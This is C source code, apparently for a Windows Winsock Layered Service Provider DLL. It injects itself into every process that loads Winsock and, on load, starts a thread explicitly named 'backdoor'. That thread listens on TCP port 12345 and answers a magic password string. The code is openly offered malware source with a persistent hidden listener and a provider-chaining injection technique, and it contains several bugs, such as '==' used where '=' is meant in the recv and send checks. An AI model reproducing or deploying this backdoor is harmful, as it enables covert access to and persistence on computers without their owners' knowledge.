#pragma data_seg("Shared") 
int     dllcount=0;
#pragma data_seg()
#pragma comment (linker,"/section:Shared,rws")

#define  UNICODE
#define  _UNICODE

#include <ws2spi.h>
#include <tchar.h>
#include <winsock2.h>  

GUID  filterguid={0xc5fabbd0,0x9736,0x11d1,{0x93,0x7f,0x00,0xc0,0x4f,0xad,0x86,0x0d}};

LPWSAPROTOCOL_INFOW  protoinfo=NULL;
WSPPROC_TABLE        nextproctable;
DWORD                protoinfosize=0;
HANDLE               hmutex;  
HANDLE               hthread; 
POINT                nowpt;
int                  totalprotos=0;

DWORD WINAPI backdoor(LPVOID)   
{
	SOCKET   sock,sockt;
	WSADATA  wsa;
	int      iret=0;
	char     msg[25];
	struct   sockaddr_in sin;

	if(WSAStartup(MAKEWORD(2,2),&wsa))
	{
		OutputDebugString(_T("WSAStartup Error!"));
		return 0;
	}

	if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
	{
		OutputDebugString(_T("Socket Error!"));
		return 0;
	}

	sin.sin_addr.s_addr=htons(INADDR_ANY);
	sin.sin_family=AF_INET;
	sin.sin_port=htons(12345);

	if(bind(sock,(struct sockaddr *)&sin,sizeof(sin))==SOCKET_ERROR)
	{
		OutputDebugString(_T("Bind Error!"));
		return 0;
	}

	if(listen(sock,5)==SOCKET_ERROR)
	{
		OutputDebugString(_T("Listen Error!"));
		return 0;
	}

    while(1)
	{
		if((sockt=accept(sock,NULL,NULL))==SOCKET_ERROR)
		{
	    	OutputDebugString(_T("Accept Error!"));
	    	continue;
		}

		
		if((iret==recv(sockt,msg,sizeof(msg),0))==SOCKET_ERROR)
		{
			OutputDebugString(_T("Recv Error!"));
			closesocket(sockt);
			continue;  
		}

		if(strstr(msg,"i am TOo2y"))
		{
			memset(msg,0,sizeof(msg));
			memcpy(msg,"i am waiting for you !",sizeof(msg)-1);

			if((iret==send(sockt,msg,sizeof(msg),0))==SOCKET_ERROR)
			{
				OutputDebugString(_T("Send Error!"));
				closesocket(sockt);
				continue;
			}
		}
		OutputDebugString(_T("Transport Successfully"));
		closesocket(sockt);
	}
	return 1;
}

BOOL getfilter()
{
	int    errorcode;

	protoinfo=NULL;
	protoinfosize=0;
	totalprotos=0;

	if(WSCEnumProtocols(NULL,protoinfo,&protoinfosize,&errorcode)==SOCKET_ERROR)
	{
		if(errorcode!=WSAENOBUFS)
		{
			OutputDebugString(_T("First WSCEnumProtocols Error!")); 
    		return FALSE;
		}
	}

	if((protoinfo=(LPWSAPROTOCOL_INFOW)GlobalAlloc(GPTR,protoinfosize))==NULL)
	{
		OutputDebugString(_T("GlobalAlloc Error!"));   
		return FALSE;
	}

	if((totalprotos=WSCEnumProtocols(NULL,protoinfo,&protoinfosize,&errorcode))==SOCKET_ERROR)
	{
		OutputDebugString(_T("Second WSCEnumProtocols Error!"));  
		return FALSE;
	}

	return TRUE;
}

void freefilter()
{
	GlobalFree(protoinfo);
}

BOOL WINAPI DllMain(HINSTANCE hmodule,
					DWORD     reason,
					LPVOID    lpreserved)
{
	TCHAR   processname[MAX_PATH];
	TCHAR   showmessage[MAX_PATH+25];


	switch(reason)
	{
	case DLL_PROCESS_ATTACH:
		{
    	    GetModuleFileName(NULL,processname,MAX_PATH);
      		_tcscpy(showmessage,processname);
        	_tcscat(showmessage,_T(" Loading my dll ..."));
          	OutputDebugString(showmessage);  

			hmutex=CreateMutex(NULL,FALSE,NULL);    //  ? 
			WaitForSingleObject(hmutex,INFINITE); 
			dllcount++;
			if(dllcount==1)
			{
				OutputDebugString(_T("Start the backdoor ...")); 
				hthread=CreateThread(NULL,0,backdoor,NULL,0,NULL);  
			}
			ReleaseMutex(hmutex);
			break;
		}
	case DLL_PROCESS_DETACH:
		{
			WaitForSingleObject(hmutex,INFINITE);
			dllcount--;
			if(dllcount==0)
			{
				CloseHandle(hthread);
			}
			ReleaseMutex(hmutex);
			CloseHandle(hthread);
			break;
		}
	}
	return TRUE;
}


int WSPAPI WSPStartup(
	WORD				wversionrequested,
	LPWSPDATA			lpwspdata,
	LPWSAPROTOCOL_INFOW	lpprotoinfo,
	WSPUPCALLTABLE		upcalltable,
	LPWSPPROC_TABLE		lpproctable)
{
	int           i;
	int           errorcode;
    int           filterpathlen;
	DWORD         layerid=0;
    DWORD         nextlayerid=0;
    TCHAR         *filterpath;
	HINSTANCE     hfilter;
	LPWSPSTARTUP  wspstartupfunc=NULL;

	if(lpprotoinfo->ProtocolChain.ChainLen<=1)
	{
    	OutputDebugString(_T("ChainLen<=1"));    
		return FALSE;
	}
	
	getfilter();

	for(i=0;i<totalprotos;i++)
	{
		if(memcmp(&protoinfo[i].ProviderId,&filterguid,sizeof(GUID))==0)
		{
			layerid=protoinfo[i].dwCatalogEntryId;
			break;
		}
	}

	for(i=0;i<lpprotoinfo->ProtocolChain.ChainLen;i++)
	{
		if(lpprotoinfo->ProtocolChain.ChainEntries[i]==layerid)
		{
			nextlayerid=lpprotoinfo->ProtocolChain.ChainEntries[i+1];
			break;
		}
	}

	// if nextlayerid == 0  ?

	filterpathlen=MAX_PATH;
	filterpath=(TCHAR*)GlobalAlloc(GPTR,filterpathlen);  
	for(i=0;i<totalprotos;i++)
	{
		if(nextlayerid==protoinfo[i].dwCatalogEntryId)
		{
			if(WSCGetProviderPath(&protoinfo[i].ProviderId,filterpath,&filterpathlen,&errorcode)==SOCKET_ERROR)
			{
            	OutputDebugString(_T("WSCGetProviderPath Error!")); 
				return WSAEPROVIDERFAILEDINIT;
			}
			break;
		}
	}

	if(!ExpandEnvironmentStrings(filterpath,filterpath,MAX_PATH))
	{
     	OutputDebugString(_T("ExpandEnvironmentStrings Error!"));  
		return WSAEPROVIDERFAILEDINIT;
	}

	if((hfilter=LoadLibrary(filterpath))==NULL)
	{
    	OutputDebugString(_T("LoadLibrary Error!"));
		return WSAEPROVIDERFAILEDINIT;
	}

	if((wspstartupfunc=(LPWSPSTARTUP)GetProcAddress(hfilter,"WSPStartup"))==NULL)
	{
		OutputDebugString(_T("GetProcessAddress Error!"));
		return WSAEPROVIDERFAILEDINIT;
	}

	if((errorcode=wspstartupfunc(wversionrequested,lpwspdata,lpprotoinfo,upcalltable,lpproctable))!=ERROR_SUCCESS)
	{
		OutputDebugString(_T("wspstartupfunc Error!")); 
		return errorcode;
	}

	nextproctable=*lpproctable;

	freefilter();
	return 0;
}


